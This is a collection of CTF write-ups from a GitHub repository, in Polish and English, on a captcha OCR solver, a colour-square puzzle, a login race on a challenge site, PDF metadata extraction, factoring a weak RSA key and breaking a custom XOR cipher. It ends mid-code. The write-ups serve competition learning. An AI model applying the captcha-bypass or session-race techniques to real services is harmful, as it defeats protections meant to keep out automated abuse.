Tesseract and then score the result with heuristic:\n\n\tdef on_blacklist(text):\n\t\tif len(text) != 4:\n\t\t\treturn True\n\t\tblacklisted = [\"I\", \"0\", \"O\", \"Z\", \"Q\", \"2\", \"S\", \"3\", \"G\", \"9\", \"1\", \"l\", \"C\", \"X\", \"V\", \"B\", \"8\", \"U\"]\n\t\tfor character in blacklisted:\n\t\t\tif character in text:\n\t\t\t\treturn True\n\t\tmatcher = re.match(\"[a-zA-Z0-9]+\", text)\n\t\tif matcher is None or len(matcher.group()) != 4:\n\t\t\treturn True\n\t\treturn False\n\nWe reject all solutions that doesn't have 4 symbols from `[a-zA-Z0-9]` range, since we know that all captchas should have 4 alphanumeric symbols. Additionally we reject all solutions with risky symbols:\n\n* Tesseract mistakes sometimes: `O0Q`, `2Z`, `B8S`, `Il1`, `6G`, `9g`\n* Tesseract often recognizes the letter case incorrectly - if it says there is a small letter it's fine, but if it ways it's a capital letter then we can't be sure. We reject all symbols where small and capital versions are similar: `XVUCSZO`\n\nThis way we get a 100% accuracy solver, however it works rather slowly since it rejects ~90% of tested codes.\nAfter solving all 500 captchas we get:\n\n![](./solved.png)", "timestamp": "2025-10-21T22:03:06.100382"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-26-trendmicro/colors/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-26-trendmicro/colors/README.md", "content": "## Colors (ppc/Programming, 100p)\n\n### PL Version\n`for ENG version scroll down`\n\nSystem wyświetlał na stronie internetowej obrazek złożony z kwadratów. Wsystkie kwadraty oprócz jednego miały taki sam kolor - jeden z nich miał lekko inny odcień. Celem zadania było kliknięcie w ten odmienny kwadrat. System rejestrował gdzie kliknęliśmy i na tej podstawie oceniał poprawność rozwiązania i prezentował kolejny przykład.\nCelem było rozwiązanie kilkudziesieciu przykładów pod rząd w celu uzyskania flagi.\n\n![](./squares.png)\n\nAby rozwiązać zadany problem przygotowaliśmy skrypt w pythonie z użyciem Python Images Library dostępny [tutaj](colors.py).\nSkrypt pobiera zadany obraz, wylicza rozkład kolorów pikseli i na tej podstawie wybiera najrzadziej występujący kolor (pomiajając biały, który oddziela kwadarty od siebie). Następnie skanujemy obraz w poszukiwaniu jakiegoś piksela tego koloru i zwracamy pozycję tego piksela jako rozwiązanie.\n\n\tdef getPixel(picture_path):\n\t\tfd = urllib.urlopen(picture_path)\n\t\timage_file = io.BytesIO(fd.read())\n\t\tim = Image.open(image_file)\n\t\tcolors_distribution = im.getcolors()\n\t\tnon_white = [color for color in colors_distribution if color[1] != (255, 255, 255)]\n\t\tordered = sorted(non_white, key=lambda x: x[0], reverse=False)\n\t\tprint(ordered[0])\n\t\twidth, height = im.size\n\t\tfor index, color in enumerate(im.getdata()):\n\t\t\tif color == ordered[0][1]:\n\t\t\t\ty = index / width\n\t\t\t\tx = index % width\n\t\t\t\treturn x, y\n\nPo rozwiązaniu kilkudziesięciu przykładów otrzymujemy: `TMCTF{U must have R0807 3Y3s!}`\n\n### ENG Version\n\nThe system displays on a webpage an image consisting of squares. All but one have the same color - one has a slighly different shade. The task was to click in on the square with different color. The system would register the click location and decide if our solution is correct. We had to solve multiple consecutive examples in order to get the flag.\n\n![](./squares.png)\n\nTo solve the task we prepared a python script using Python Images Library available [here](colors.py).\nThe script downloads the picture, calculates the colors disitrbution and base don this selects the least frequent color (omitting white, which separates the squares). Next we can the picture looking for a pixel with this color and we return this pixel position as the solution.\n\n\tdef getPixel(picture_path):\n\t\tfd = urllib.urlopen(picture_path)\n\t\timage_file = io.BytesIO(fd.read())\n\t\tim = Image.open(image_file)\n\t\tcolors_distribution = im.getcolors()\n\t\tnon_white = [color for color in colors_distribution if color[1] != (255, 255, 255)]\n\t\tordered = sorted(non_white, key=lambda x: x[0], reverse=False)\n\t\tprint(ordered[0])\n\t\twidth, height = im.size\n\t\tfor index, color in enumerate(im.getdata()):\n\t\t\tif color == ordered[0][1]:\n\t\t\t\ty = index / width\n\t\t\t\tx = index % width\n\t\t\t\treturn x, y\n\nAfter few dozens of examples we finally get: `TMCTF{U must have R0807 3Y3s!}`", "timestamp": "2025-10-21T22:03:06.380328"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-26-trendmicro/offensive100/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-26-trendmicro/offensive100/README.md", "content": "#Offensive 100 (web, 100p)\r\n\r\n## PL\r\n`For eng scroll down`\r\n\r\nW tym zadaniu dostajemy stronę z 3 sekcjami:\r\n\r\n  * Przycisk Sign up\r\n  * Przycisk Sign in\r\n  * Tabela z logiem logowań\r\n  \r\nW tym zadaniu trzeba było zauważyć 2 rzeczy:\r\n\r\n * Czasami, logując się, zamiast zalogować się na swoje konto zostajemy zalogowani na konto osoby która zalogowała się w tym samym czasie.\r\n\r\n * Dokładnie co minutę, loguje się ktoś z id równym 0 (przypuszczamy, że jest to konto na które mamy się dostać)\r\n\r\nŁącząc te dwa zjawiska postanawiamy zalogować się na swoje konto dokładnie w zerowej sekundzie.\r\n Nie działa, robimy reload strony iiii...\r\n \r\n ![Alt text](pic1.png)\r\n\r\n## ENG\r\n\r\nIn this task we get a web site with 3 sections:\r\n * Sign up button\r\n * Sign in button\r\n * Accounts logged in log\r\n\r\nIn order to complete this challange we had to notice 2 things:\r\n\r\n * Sometimes, when we log in, instead of logging in to our account we get redirected a account that logged in the same time.\r\n * Exactly every minute, a id=0 login appears in the log. (That probably is the account we have to get into)\r\n \r\nUsing theese 2 observations we decide to log in to our account at exactly 0 seconds.\r\nWhen the site loads we're still on our accounts page, we try to reload the site and...\r\n  ![Alt text](pic1.png)\r\n", "timestamp": "2025-10-21T22:03:06.660899"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-26-trendmicro/other100/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-26-trendmicro/other100/README.md", "content": "# Fix my pdf (misc, 100p)\n\n## PL \n`For ENG scroll down`\n\nDostajemy [taki oto pdf](fix_my_pdf.pdf) od autorów zadania.\n\nWszelkie próby załadowania go do jakiegoś czytnika pdf kończą się niepowodzeniem - wyraźnie wygląda na uszkodzony.\n\nMożemy jeszcze otworzyć go z ciekawości w notepadzie/vimie/emacsie żeby przyjrzeć sie jego wewnętrzenej strukturze - niestety wszystkie streamy w pdfie są skompresowane, co oznacza że ręcznie ich nie podejrzymy.\n\nW tym momencie należy więc skorzystać z jakiegoś narzędzia do dumpowania streamów pdfa. Do głowy przychodzi qpdf, ale jako dzieci windowsa wybieramy prostsze narzędzie - pdf stream dumper.\n\nŁadujemy pdf, i jeden ze streamów wydaje sie ciekawszy (dla oka ludzkiego) niż pozostałe - zawiera XML z metadanymi. Szczególnie ciekawa jest zawartość `<xmpGImg:image>` - dekodujemy więc ją i zapisujemy do oddzielnego pliku (pamiętając żeby zamienić/usunąć wcześniej ciągi `&#xA;` z base64 - autor tego writeupa zapomniał o tym na początku i już myślał że jego pomysł na zadanie okazał się ślepą uliczką).\n\nOtrzymujemy taki oto obrazek:\n\n![](./result.jpg)\n\nOdczytujemy z niego flagę: TMCTF{There is always light behind the clouds}.\n\n## ENG\n\nWe get [this pdf file](fix_my_pdf.pdf) from the task authors.\n\nAll attempts to open it with a pdf reader fail - it seems to be broken.\n\nWe can still open it with notepad/vim/emacs to look at the internal structure -  unfortunately all pdf streams are compressed so we can't easily read them.\n\nWe decided to use a pdf stream dump tool. We could have used qpdf but since we're on windows at the moment we chose a different tool - pdf stream dumper.\n\nWe load the pdf and one of the streams seems more interesting than the others (at least from human point of view) - it contains XML with metadata.\nParticularly insteresting is `<xmpGImg:image>` - we decode this and we save it to a different file (remembering to replace/remove `&#xA;` from base64 - author of this writeup forgot about this initially and almost assumed that his approach to solve the task was incorrect)\n\nWe finally get this picture:\n\n![](./result.jpg)\n\nWe read the flag from it: `TMCTF{There is always light behind the clouds}.`\n", "timestamp": "2025-10-21T22:03:06.999656"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-26-trendmicro/rsa/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-26-trendmicro/rsa/README.md", "content": "## RSA (crypto, 100p)\n\n### PL Version\n`for ENG version scroll down`\n\nZadanie polegało na odszyfrowaniu wiadomości szyfrowanej za pomocą RSA mając dostęp do klucza publicznego. Wiadomość to:\n\n`kPmDFLk5b/torG53sThWwEeNm0AIpEQek0rVG3vCttc=`\n\nA klucz:\n\n\t-----BEGIN PUBLIC KEY-----\n\tMDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhALYtzp8lgWNXI9trGI8S8EacvuDLxdrL\n\tNsNuDJa26nv8AgMBAAE=\n\t-----END PUBLIC KEY-----\n\nZadanie wspomniało też, że klucz publiczny nie jest całkiem poprawny i brakuje mu jakiegoś bitu. \nDekodujemy klucz publiczny i uzyskujemy:\n\n\tn = 82401872610398250859431855480217685317486932934710222647212042489320711027708\n\te = 65537\n\nWidzimy od razu że wartość `n` jest niepoprawna bo nie jest iloczynem 2 liczb pierwszych (dzieli się przez 4). Zamieniamy więc ostatni bit z 0 na 1 uzyskując liczbę `82401872610398250859431855480217685317486932934710222647212042489320711027709`\n\nKlucz jest bardzo krótki - ma tylko 256 bitów co oznacza, że jest podatny na faktoryzację. Dokonujemy jej za pomocą narzędzia `yafu`:\n\n![](./rsa.png)\n\nNa tej podstawie uzyskujemy liczby `p` oraz `q` potrzebne do odtworzenia klucza prywatnego. Dokonujemy tego za pomocą rozszerzonego algorytmu Euklidesa:\n\n\tdef egcd(a, b):\n\t\tu, u1 = 1, 0\n\t\tv, v1 = 0, 1\n\t\twhile b:\n\t\t\tq = a // b\n\t\t\tu, u1 = u1, u - q * u1\n\t\t\tv, v1 = v1, v - q * v1\n\t\t\ta, b = b, a - q * b\n\t\treturn a, u, v\n\n    q = 295214597363242917440342570226980714417\n    p = 279125332373073513017147096164124452877\n    e = 65537\n    n = 82401872610398250859431855480217685317486932934710222647212042489320711027709\n    phi = (p - 1) * (q - 1)\n    gcd, a, b = egcd(e, phi)\n    d = a\n    if d < 0:\n        d += phi\n    print(\"n:  \" + str(d))\n\nMając liczbę `d` możemy teraz dokonać dekodowania wiadomości. Zamieniamy wiadomość na liczbę:\n\n`ct = 65573899802596942877560813284504892432930279657642337826069076977341847221975`\n\nA następnie wykonujemy:\n\n    pt = pow(ct, d, n)\n    print(\"pt: \" + long_to_bytes(pt))\n\t\nI uzyskujemy flagę: `TMCTF{$@!zbo4+qt9=5}`\n\n### ENG Version\n\nThe task was to crack RSA encoded message based on provided public key. The message was:\n\n`kPmDFLk5b/torG53sThWwEeNm0AIpEQek0rVG3vCttc=`\n\nAnd the key was:\n\n\t-----BEGIN PUBLIC KEY-----\n\tMDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhALYtzp8lgWNXI9trGI8S8EacvuDLxdrL\n\tNsNuDJa26nv8AgMBAAE=\n\t-----END PUBLIC KEY-----\n\nThe task description mentioned that there is something wrong with public key and there is a bit missing.\nWe decode the public key and we get:\n\n\tn = 82401872610398250859431855480217685317486932934710222647212042489320711027708\n\te = 65537\n\nWe can clearly see that the `n` is incorrect since it's not a product of 2 prime numbers (it is divisible by 4). We swtich last bit from 0 to 1 and we get `82401872610398250859431855480217685317486932934710222647212042489320711027709`\n\nThe key is very short - only 256 bits so we can factor it. We do it using `yafu`:\n\n![](./rsa.png)\n\nBased on this we get `p` and `q` numbers required for private key recovery. We do this with extended euclidean algorithm:\n\n\tdef egcd(a, b):\n\t\tu, u1 = 1, 0\n\t\tv, v1 = 0, 1\n\t\twhile b:\n\t\t\tq = a // b\n\t\t\tu, u1 = u1, u - q * u1\n\t\t\tv, v1 = v1, v - q * v1\n\t\t\ta, b = b, a - q * b\n\t\treturn a, u, v\n\n    q = 295214597363242917440342570226980714417\n    p = 279125332373073513017147096164124452877\n    e = 65537\n    n = 82401872610398250859431855480217685317486932934710222647212042489320711027709\n    phi = (p - 1) * (q - 1)\n    gcd, a, b = egcd(e, phi)\n    d = a\n    if d < 0:\n        d += phi\n    print(\"n:  \" + str(d))\n\nWith the `d` number we can now decode the message. We change the message into a number:\n\n`ct = 65573899802596942877560813284504892432930279657642337826069076977341847221975`\n\nExecute:\n\n    pt = pow(ct, d, n)\n    print(\"pt: \" + long_to_bytes(pt))\n\t\nAnd get the flag: `TMCTF{$@!zbo4+qt9=5}`", "timestamp": "2025-10-21T22:03:07.243879"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-02-dctf/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-02-dctf/README.md", "content": "# Writeup DefCamp CTF 2015\n\nUczestniczyliśmy (msm, Rev, other019, nazywam i Shalom) w DefCamp CTF, i znowu spróbujemy opisać zadania z którymi walczyliśmy (a przynajmniej te, które pokonaliśmy).\n\nOgólne wrażenia:\nWiększość zadań wymagała łączenia się przez VPN aby uzyskać dostęp do infrastruktury organizatora. Było to o tyle problematyczne, że VPN lubił zrywać połączenie i działać bardzo wolno, co mocno utrudniało pracę nad niektórymi zadaniami.\n\nA teraz opisy zadań po kolei.\n\n# Spis treści:\n* [Warm up (web 100)](web_100)\n* [The hylian dude (web 200)]()\n* [Rocket Science Admin Panel (web 300)]()\n* [CSS Engineer (web 400)]()\n* [Custom function engineering (crypto 300)](crypto_300_custom_function)\n* [11 (crypto 50)](crypto_50)\n* [Password encrypting tool (pwn 100)]()\n* [No Crypto (pwn 200)]()\n* [Entry language (reverse 100)](re_100_entry)\n* [Link & Switch (reverse 200)](re_200_link)\n* [LBS Checker (reverse 300)](re_300_lbs_checker) \n* [Such exploit, much random (pwn 300)]()\n* [Master of Reversing (reverse 400)](re_400_master_of_reversing)\n* [She said it doesn't matter (misc/stego 100)](misc_100_doesnt_matter)\n* [Try harder! (misc/stego 200)](misc_200_try_harder)\n* [Can you read Pacifico? (misc/ppc 400+1)](misc_400_captcha)\n\n# Wykres\n\n![](chart.png)\n\n# Zakończenie\n\nZachęcamy do komentarzy/pytań/czegokolwiek.\n", "timestamp": "2025-10-21T22:03:07.821456"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-02-dctf/crypto_300_custom_function/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-02-dctf/crypto_300_custom_function/README.md", "content": "﻿## Crypto 300 (crypto, 300p)\n\n### PL\n\n[ENG](#eng-version)\n\nBardzo ciekawe zadanie dla nas, musieliśmy sporo z nim powalczyć, ale w końcu udało się rozwiązać zagadkę szyfru.\n\nOtóż dostajemy taki szyfr:\n\n    320b1c5900180a034c74441819004557415b0e0d1a316918011845524147384f5700264f48091e45\n    00110e41030d1203460b1d0752150411541b455741520544111d0000131e0159110f0c16451b0f1c\n    4a74120a170d460e13001e120a1106431e0c1c0a0a1017135a4e381b16530f330006411953664334\n    593654114e114c09532f271c490630110e0b0b\n\nOraz kod którym go zaszyfrowano (w wersji przepisanej przez nas do pythona, nie jesteśmy fanami PHP):\n\n    def encrypt(plainText):\n        space = 10\n        cipherText = \"\"\n        for i in range(len(plainText)):\n            if i + space < len(plainText) - 1:\n                cipherText += chr(ord(plainText[i]) ^ ord(plainText[i + space]))\n            else:\n                cipherText += chr(ord(plainText[i]) ^ ord(plainText[space]))\n            if ord(plainText[i]) % 2 == 0:\n                space += 1\n            else:\n                space -= 1\n        return cipherText\n\nBardzo komplikuje wszystko ta ruszająca się space. Ale jej stan zależy tylko od najniższego bitu, co wykorzystaliśmy przy rozwiązywaniu zadania.\nRozwiązywaliśmy je w dwóch częściach - najpierw odzyskaliśmy najniższe bity plaintextu, a później dopiero całe hasło.\n\nPierwsza próba złamania najniższych bitów wyglądała tak:\n\n    def verify(cipherText, guessedBits):\n        space = 10\n        for i in range(len(guessedBits)):\n            if i + space < len(cipherText) - 1:\n                if i + space >= len(guessedBits):\n                    return True\n                if (ord(cipherText[i]) & 1) != ((ord(guessedBits[i]) & 1) ^ (ord(guessedBits[i + space]) & 1)):\n                    return False\n            else:\n                if space >= len(guessedBits):\n                    return True\n                if (ord(cipherText[i]) & 1) != ((ord(guessedBits[i]) & 1) ^ (ord(guessedBits[space]) & 1)):\n                    return False\n            if guessedBits[i] == '0':\n                space += 1\n            else:\n                space -= 1\n        return True\n\n\n    def decrypt(cipherText, guessedBits, i):\n        if i >= len(cipherText):\n            print 'ok:', guessedBits\n            return\n        if len(guessedBits) == 10:\n            print (int(guessedBits, 2) / 1024.0) * 100, '%'\n        if verify(cipherText, guessedBits):\n            decrypt(cipherText, guessedBits + '0', i + 1)\n            decrypt(cipherText, guessedBits + '1', i + 1)\n\nKonkretnie, był to bruteforce z odcinaniem - sprawdzaliśmy wszystkie możliwości, i jeśli verify() się nie udał, wychodziliśmy ze sprawdzanej gałęzi\n\nNiestety, było to dużo za wolne. Zaczeliśmy od mikrooptymalizacji - jeśli dobrze pamiętam, przyśpieszyło to wykonanie skryptu prawie 600 razy (!) (a używaliśmy już pypy do wszystkich testów i tak):\n\n    def verify(cipherText, guessedBits, length, guessed_len):\n        space = 10\n        for i in range(guessed_len):\n            if i + space < length - 1:\n                if i + space >= guessed_len:\n                    return True\n                if (cipherText[i] & 1) != ((guessedBits[i] & 1) ^ (guessedBits[i + space] & 1)):\n                    return False\n            else:\n                if space >= guessed_len:\n                    return True\n                if (cipherText[i] & 1) != ((guessedBits[i] & 1) ^ (guessedBits[space] & 1)):\n                    return False\n            if guessedBits[i] == 0:\n                space += 1\n            else:\n                space -= 1\n        return True\n\n\n    def decrypt(cipherText):\n        guessed_bits = [0] * len(cipherText)\n        length = len(cipherText)\n        i = 0\n        orded_cipher = [ord(c) for c in cipherText]\n        decrypt_r(orded_cipher, guessed_bits, i, length)\n\n\n    def decrypt_r(orded_cipher, guessedBits, i, length):\n        if i >= length:\n            print 'ok:', guessedBits\n            return\n        if i == 10:\n            print (int(''.join(str(c) for c in guessedBits[:10]), 2) / 1024.0) * 100, '%'\n        if verify(orded_cipher, guessedBits, length, i):\n            guessedBits[i] = 0\n            decrypt_r(orded_cipher, guessedBits, i + 1, length)\n            guessedBits[i] = 1\n            decrypt_r(orded_cipher, guessedBits, i + 1, length)\n\nWykonywało się już relatywnie szybko. Odpaliliśmy to na czterech rdzeniach u jednego z członków naszego zespołu.\n\nAle nie zapowiadało się to zbyt optymistycznie, więc spróbowaliśmy jeszcze zmienić podejście (viva la algorytmika!). Zamiast za każdym razem weryfikować całe hasło (i wychodzić w przód niepotrzebnie), odrzucać niemożliwe rozwiązania od razu:\n\n    def decrypt(cipherText):\n        guessed_bits = ['?'] * len(cipherText)\n        length = len(cipherText)\n        i = 0\n        orded_cipher = [ord(c) & 1 for c in cipherText]\n        decrypt_r(orded_cipher, guessed_bits, i, length, 10)\n    \n    \n    def try_guess(orded_cipher, guessedbits, i, length, guess, space):\n        guessedbits = list(guessedbits)\n        guessedbits[i] = guess\n        if i + space < length - 1:\n            nextndx = i + space\n        else:\n            nextndx = space\n    \n        nextbit = orded_cipher[i] ^ guess\n        if guess == 0:\n            newspace = space + 1\n        else:\n            newspace = space - 1\n    \n        if guessedbits[nextndx] == '?' or guessedbits[nextndx] == nextbit:\n            guessedbits[nextndx] = nextbit\n            decrypt_r(orded_cipher, guessedbits, i + 1, length, newspace)\n    \n    def decrypt_r(orded_cipher, guessedbits, i, length, space):\n        if i >= length:\n            print 'ok:', ''.join(str(c) for c in guessedbits)\n            return\n        if guessedbits[i] == '?':\n            try_guess(orded_cipher, guessedbits, i, length, 0, space)\n            try_guess(orded_cipher, guessedbits, i, length, 1, space)\n        elif guessedbits[i] == 0:\n            try_guess(orded_cipher, guessedbits, i, length, 0, space)\n        elif guessedbits[i] == 1:\n            try_guess(orded_cipher, guessedbits, i, length, 1, space)\n\nUżywamy tu swoistego triboola w tablicy guessedbits, czyli 0 oznacza \"na pewno będzie tam 0\", 1 oznacza \"na pewno będzie tam 1\", a ? oznacza ofc \"nie wiadomo\".\n\nPisanie i debugowanie tej wersji zajęło nam około godziny. A rozwiązanie dała dosłownie kilka sekund po uruchomieniu (poprzednia wersja ciągle się liczyła jeszcze).\n\nTak czy inaczej, poprawne rozwiązania (szukaliśmy tutaj najniższych bitów plaintextu, przypominam) były cztery:\n\nsln = '1001011001110101110010100010110110010000010000100111010010111010010100111100001001110000011110010011110100101001010110010110101000110110100'\nsln = '1001011001110101110010100010110110000100010111010011010000011001001100111100111011110000000110100001110100101001010110010110101000110110100'\nsln = '0101011000010101110100001010000110100101001011010111000100111000010010000011001000110101001110101111110100001000110110101001010111111110100'\nsln = '0101011000010101110100001010000110100101001011000011000100111000110010001100011001110101000010100001110101100111000100101001010111001001011'\n\nOtrzymaliśmy w ten sposób układ równań dla 140 zmiennych. Nasza pierwsza próba to było użycie gotowego solvera do rozwiązania tego układu. Przykładowo dla 4 rozwiązania:\n\n    from constraint import *\n    problem = Problem()\n\n    ODD = range(33, 128, 2) + [13]\n    EVEN = range(32, 128, 2) + [10]\n\n    problem.addVariable(0, ODD)\n    problem.addVariable(1, EVEN)\n    problem.addVariable(2, EVEN)\n    problem.addVariable(3, ODD)\n    problem.addVariable(4, EVEN)\n    # (...) snip\n    problem.addVariable(134, ODD)\n    problem.addVariable(135, EVEN)\n    problem.addVariable(136, ODD)\n    problem.addVariable(137, EVEN)\n    problem.addVariable(138, EVEN)\n\n    problem.addConstraint(lambda av, bv: av ^ bv == 0x32, (0, 10))\n    problem.addConstraint(lambda av, bv: av ^ bv == 0xb, (1, 10))\n    problem.addConstraint(lambda av, bv: av ^ bv == 0x1c, (2, 12))\n    problem.addConstraint(lambda av, bv: av ^ bv == 0x59, (3, 14))\n    problem.addConstraint(lambda av, bv: av ^ bv == 0x0, (4, 14))\n    problem.addConstraint(lambda av, bv: av ^ bv == 0x18, (5, 16))\n    # (...) snip\n    problem.addConstraint(lambda av, bv: av ^ bv == 0x6, (133, 17))\n    problem.addConstraint(lambda av, bv: av ^ bv == 0x30, (134, 16))\n    problem.addConstraint(lambda av, bv: av ^ bv == 0x11, (135, 15))\n    problem.addConstraint(lambda av, bv: av ^ bv == 0xe, (136, 16))\n    problem.addConstraint(lambda av, bv: av ^ bv == 0xb, (137, 15))\n    problem.addConstraint(lambda av, bv: av ^ bv == 0xb, (138, 16))\n\n    print problem.getSolutions()\n\nNiestety, solver wykonywał się wieki (nie mamy pewności czy wykonałby się w tym stuleciu). Dlatego, w czasie kiedy on się liczył, my zabraliśmy się za ręczne pisanie solvera:\n\n    import string\n    slv = [None] * len(sln)\n    \n    def filling_pass(slv):\n        while True:\n            any = False\n            space = 10\n            for i in range(len(sln)):\n                if i + space < len(sln) - 1:\n                    nx = i + space\n                else:\n                    nx = space\n                if sln[i] == '0':\n                    space += 1\n                else:\n                    space -= 1\n                if slv[i] is not None:\n                    sn = ord(slv[i]) ^ ord(ciph[i])\n                    if slv[nx] is None:\n                        slv[nx] = chr(sn)\n                        if (sn >= 32 and sn < 127) or sn == 10 or sn == 13:\n                            any = True\n                        else:\n                            return False\n                    else:\n                        if slv[nx] != chr(sn):\n                            return False\n            if not any:\n                return True\n    \n    def tryit(slvo, start):\n        while slvo[start] is not None:\n            start += 1\n            if start >= len(slvo):\n                print ''.join(' ' if c is None else '.' if ord(c) < 32 else c for c in slvo)\n                return\n            continue\n        for c in string.printable:\n            slv = list(slvo)\n            slv[start] = c\n            possible = filling_pass(slv)\n            if possible:\n                tryit(slv, start)\n    \n    tryit(slv, 0)\n\nI po raz drugi w tym zadaniu, to co liczyło się godziny/dni naiwnym programem, po poprawie algorytmu zadziałało w *sekundy*. Cieszy że mimo postępu komputerów jednak myślenie nad wydajnością ma czasami zastosowanie.\n\nKonkretnie, nasze rozwiązanie działało na takiej zasadzie:\n\n    hasło = ['?'] * długość_hasła\n    while (nie wszystkie literki w haśle znane):\n        for char in charset:\n            podstaw char za kolejną literkę w haśle\n            wywnioskuj na podstawie znanych ograniczeń jak najwięcej innych znaków (funkcja filling_pass). Jeśli wyjdzie sprzeczność, zaniechaj, inaczej rekurencyjnie powtarzaj.\n\nOdpaliliśmy więc nasz algorytm:\n\n    C:\\Users\\xxx\\Code\\RE\\CTF\\2015-10-02 def\\crypto300>python hackz.py\n    Cpgl5bpyy5qz{p5lz`5VAS5eb{pg;5[zb5\\5}tcp5az5r|cp5lz`5a}p5gpbtgq5szg5tyy5a}|f5}tgq5bzg~5zg5xtlwp5r`pff|{r;5A}p5sytr5|f5vgleat{tylf|fJ|fJ}tgq\n    Izmf?hzss?{pqz?fpj?\\KY?ohqzm1?Qph?V?w~iz?kp?xviz?fpj?kwz?mzh~m{?ypm?~ss?kwvl?w~m{?hpmt?pm?r~f}z?xjzllvqx1?Kwz?ys~x?vl?|mfok~q~sflvl@vl@w~m{\n    Qbu~'pbkk'chib'~hr'DSA'wpibu)'Ihp'N'ofqb'sh'`nqb'~hr'sob'ubpfuc'ahu'fkk'sont'ofuc'phul'hu'jf~eb'`rbttni`)'Sob'akf`'nt'du~wsfifk~tntXntXofuc\n    Rav}$sahh$`kja$}kq$GPB$tsjav*$Jks$M$lera$pk$cmra$}kq$pla$vasev`$bkv$ehh$plmw$lev`$skvo$kv$ie}fa$cqawwmjc*$Pla$bhec$mw$gv}tpejeh}wmw[mw[lev`\n    S`w|%r`ii%ajk`%|jp%FQC%urk`w+%Kjr%L%mds`%qj%bls`%|jp%qm`%w`rdwa%cjw%dii%qmlv%mdwa%rjwn%jw%hd|g`%bp`vvlkb+%Qm`%cidb%lv%fw|uqdkdi|vlvZlvZmdwa\n    Tgp{\"ugnn\"fmlg\"{mw\"AVD\"rulgp,\"Lmu\"K\"jctg\"vm\"ektg\"{mw\"vjg\"pgucpf\"dmp\"cnn\"vjkq\"jcpf\"umpi\"mp\"oc{`g\"ewgqqkle,\"Vjg\"dnce\"kq\"ap{rvclcn{qkq]kq]jcpf\n    Ufqz#tfoo#glmf#zlv#@WE#stmfq-#Mlt#J#kbuf#wl#djuf#zlv#wkf#qftbqg#elq#boo#wkjp#kbqg#tlqh#lq#nbzaf#dvfppjmd-#Wkf#eobd#jp#`qzswbmbozpjp\\jp\\kbqg\n    Very well done you CTF pwner. Now I have to give you the reward for all this hard work or maybe guessing. The flag is cryptanalysis_is_hard\n    Wdsx!vdmm!enod!xnt!BUG!qvods/!Onv!H!i`wd!un!fhwd!xnt!uid!sdv`se!gns!`mm!uihr!i`se!vnsj!ns!l`xcd!ftdrrhof/!Uid!gm`f!hr!bsxqu`o`mxrhr^hr^i`se\n    Xk|w.ykbb.ja`k.wa{.MZH.~y`k| .@ay.G.foxk.za.igxk.wa{.zfk.|kyo|j.ha|.obb.zfg}.fo|j.ya|e.a|.cowlk.i{k}}g`i .Zfk.hboi.g}.m|w~zo`obw}g}Qg}Qfo|j\n\n    C:\\Users\\xxx\\Code\\RE\\CTF\\2015-10-02 def\\crypto300>\n\nŚwietnie - zdobyliśmy flagę - `cryptanalysis_is_hard`\n\n### ENG version\n\nVery interesting task for us, we had to put much effort into this by we finally solved it.\n\nWe get a ciphertext:\n\n    320b1c5900180a034c74441819004557415b0e0d1a316918011845524147384f5700264f48091e45\n    00110e41030d1203460b1d0752150411541b455741520544111d0000131e0159110f0c16451b0f1c\n    4a74120a170d460e13001e120a1106431e0c1c0a0a1017135a4e381b16530f330006411953664334\n    593654114e114c09532f271c490630110e0b0b\n\nAnd code whcih was used to encode it (rewritten to Python since we're not fans of PHP):\n\n    def encrypt(plainText):\n        space = 10\n        cipherText = \"\"\n        for i in range(len(plainText)):\n            if i + space < len(plainText) - 1:\n                cipherText += chr(ord(plainText[i]) ^ ord(plainText[i + space]))\n            else:\n                cipherText += chr(ord(plainText[i]) ^ ord(plainText[space]))\n            if ord(plainText[i]) % 2 == 0:\n                space += 1\n            else:\n                space -= 1\n        return cipherText\n\nThe biggest issue here is the moving space. However its state depends only on the lowest bit of the plaintext character, which we exploited to solve the task.\nThe solution was split into two parts - first we extracted lowest bits of the plaintext and after that we decoded the whole ciphertext.\n\nFirst attempts to extract the lowest bits:\n\n    def verify(cipherText, guessedBits):\n        space = 10\n        for i in range(len(guessedBits)):\n            if i + space < len(cipherText) - 1:\n                if i + space >= len(guessedBits):\n                    return True\n                if (ord(cipherText[i]) & 1) != ((ord(guessedBits[i]) & 1) ^ (ord(guessedBits[i + space]) & 1)):\n                    return False\n            else:\n                if space >= len(guessedBits):\n                    return True\n                if (ord(cipherText[i]) & 1) != ((ord(guessedBits[i]) & 1) ^ (ord(guessedBits[space]) & 1)):\n                    return False\n            if guessedBits[i] == '0':\n                space += 1\n            else:\n                space -= 1\n        return True\n\n\n    def decrypt(cipherText, guessedBits, i):\n        if i >= len(cipherText):\n            print 'ok:', guessedBits\n            return\n        if len(guessedBits) == 10:\n            print (int(guessedBits, 2) / 1024.0) * 100, '%'\n        if verify(cipherText, guessedBits):\n            decrypt(cipherText, guessedBits + '0', i + 1)\n            decrypt(cipherText, guessedBits + '1', i + 1)\n\nThis is a simple brute-force with prunning - we test all possibilities and if verify() failed we prune given branch.\n\nUnfortunately this was too slow. We started with some optimization of the code - and if I remember correctly this resulted in 600 times faster execution (!) (and we were already running on pypy for all the tests):\n\n    def verify(cipherText, guessedBits, length, guessed_len):\n        space = 10\n        for i in range(guessed_len):\n            if i + space < length - 1:\n                if i + space >= guessed_len:\n                    return True\n                if (cipherText[i] & 1) != ((guessedBits[i] & 1) ^ (guessedBits[i + space] & 1)):\n                    return False\n            else:\n                if space >= guessed_len:\n                    return True\n                if (cipherText[i] & 1) != ((guessedBits[i] & 1) ^ (guessedBits[space] & 1)):\n                    return False\n            if guessedBits[i] == 0:\n                space += 1\n            else:\n                space -= 1\n        return True\n\n\n    def decrypt(cipherText):\n        guessed_bits = [0] * len(cipherText)\n        length = len(cipherText)\n        i = 0\n        orded_cipher = [ord(c) for c in cipherText]\n        